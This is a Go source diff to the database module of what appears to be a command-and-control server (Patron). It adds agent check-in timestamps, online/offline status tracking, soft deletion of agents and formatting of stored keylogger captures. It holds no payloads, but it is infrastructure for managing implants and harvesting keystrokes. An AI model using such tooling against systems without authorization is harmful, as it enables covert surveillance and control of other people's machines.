@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 
+	"github.com/PatronC2/Patron/helper"
 	"github.com/PatronC2/Patron/types"
 	_ "github.com/mattn/go-sqlite3"
 	"github.com/s-christian/gollehs/lib/logger"
@@ -27,7 +28,7 @@ func InitDatabase() {
 	CREATE TABLE IF NOT EXISTS "Agents" (
 		"AgentID"	INTEGER NOT NULL UNIQUE,
 		"UUID"	TEXT NOT NULL UNIQUE,
-		"CallBackUser"	TEXT NOT NULL DEFAULT 'Not Used',
+		"Status"	TEXT NOT NULL DEFAULT 'Online',
 		"CallBackToIP"	TEXT NOT NULL DEFAULT 'Unknown',
 		"CallBackFeq"	TEXT NOT NULL DEFAULT 'Unknown',
 		"CallBackJitter"	TEXT NOT NULL DEFAULT 'Unknown',
@@ -35,7 +36,7 @@ func InitDatabase() {
 		"User"	TEXT NOT NULL DEFAULT 'Unknown',
 		"Hostname"	TEXT NOT NULL DEFAULT 'Unknown',
 		"isDeleted"	INTEGER NOT NULL DEFAULT 0,
-		"LastCallBack"	TEXT DEFAULT 'Unknown',
+		"LastCallBack" INTEGER NOT NULL DEFAULT 0,
 		PRIMARY KEY("AgentID" AUTOINCREMENT)
 	);
 	`
@@ -269,6 +270,44 @@ func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency str
 	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
 }
 
+func UpdateAgentCheckIn(UUID string, LastCallBack int64) {
+	updateAgentCheckInSQL := `UPDATE Agents SET LastCallBack= ? WHERE UUID= ?`
+
+	statement, err := db.Prepare(updateAgentCheckInSQL)
+	if err != nil {
+
+		log.Fatalln(err)
+		logger.Logf(logger.Info, "Error in DB\n")
+	}
+
+	_, err = statement.Exec(LastCallBack, UUID)
+	if err != nil {
+
+		log.Fatalln(err)
+	}
+	logger.Logf(logger.Done, "Agent %s Check in Update  \n", UUID)
+}
+
+func UpdateAgentStatus() {
+	updateAgentStatusSQL := `UPDATE Agents
+	SET Status = 'Offline'
+	WHERE AgentID IN (SELECT AgentID FROM Agents WHERE (strftime('%s','now') - LastCallBack) > (2*CallBackFeq));`
+
+	statement, err := db.Prepare(updateAgentStatusSQL)
+	if err != nil {
+
+		log.Fatalln(err)
+		logger.Logf(logger.Info, "Error in DB\n")
+	}
+
+	_, err = statement.Exec()
+	if err != nil {
+
+		log.Fatalln(err)
+	}
+	logger.Logf(logger.Info, "Agent Status Updated\n")
+}
+
 func UpdateAgentCommand(CommandUUID string, Output string, uuid string) {
 	updateAgentCommandSQL := `UPDATE Commands SET Result='1', Output= ? WHERE CommandUUID= ?`
 
@@ -302,7 +341,23 @@ func UpdateAgentKeys(UUID string, Keys string) {
 
 		log.Fatalln(err)
 	}
-	// logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
+}
+
+func DeleteAgent(UUID string) {
+	DeleteAgentSQL := `UPDATE Agents SET isDeleted=1 WHERE UUID= ?`
+
+	statement, err := db.Prepare(DeleteAgentSQL)
+	if err != nil {
+
+		log.Fatalln(err)
+		logger.Logf(logger.Info, "Error in DB\n")
+	}
+
+	_, err = statement.Exec(UUID)
+	if err != nil {
+
+		log.Fatalln(err)
+	}
 }
 
 // WEB Functions
@@ -317,7 +372,8 @@ func Agents() []types.ConfigAgent {
 		CallBackJitter, 
 		Ip, 
 		User, 
-		Hostname
+		Hostname,
+		Status
 	FROM Agents
 	WHERE isDeleted='0'
 	`
@@ -336,6 +392,7 @@ func Agents() []types.ConfigAgent {
 			&agents.AgentIP,
 			&agents.Username,
 			&agents.Hostname,
+			&agents.Status,
 		)
 		agentAppend = append(agentAppend, agents)
 	}
@@ -408,8 +465,6 @@ func Agent(uuid string) []types.Agent {
 		infoAppend = append(infoAppend, info)
 	}
 	return infoAppend
-	// logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", agentStruct.UpdateAgentConfig.Uuid, agentStruct.Command)
-	// return agentStruct
 }
 
 func Keylog(uuid string) []types.KeyReceive {
@@ -432,11 +487,10 @@ func Keylog(uuid string) []types.KeyReceive {
 			&info.Uuid,
 			&info.Keys,
 		)
+		info.Keys = helper.FormatKeyLogs(info.Keys)
 		infoAppend = append(infoAppend, info)
 	}
 	return infoAppend
-	// logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", agentStruct.UpdateAgentConfig.Uuid, agentStruct.Command)
-	// return agentStruct
 }
 
 func FetchOne(uuid string) []types.ConfigAgent {
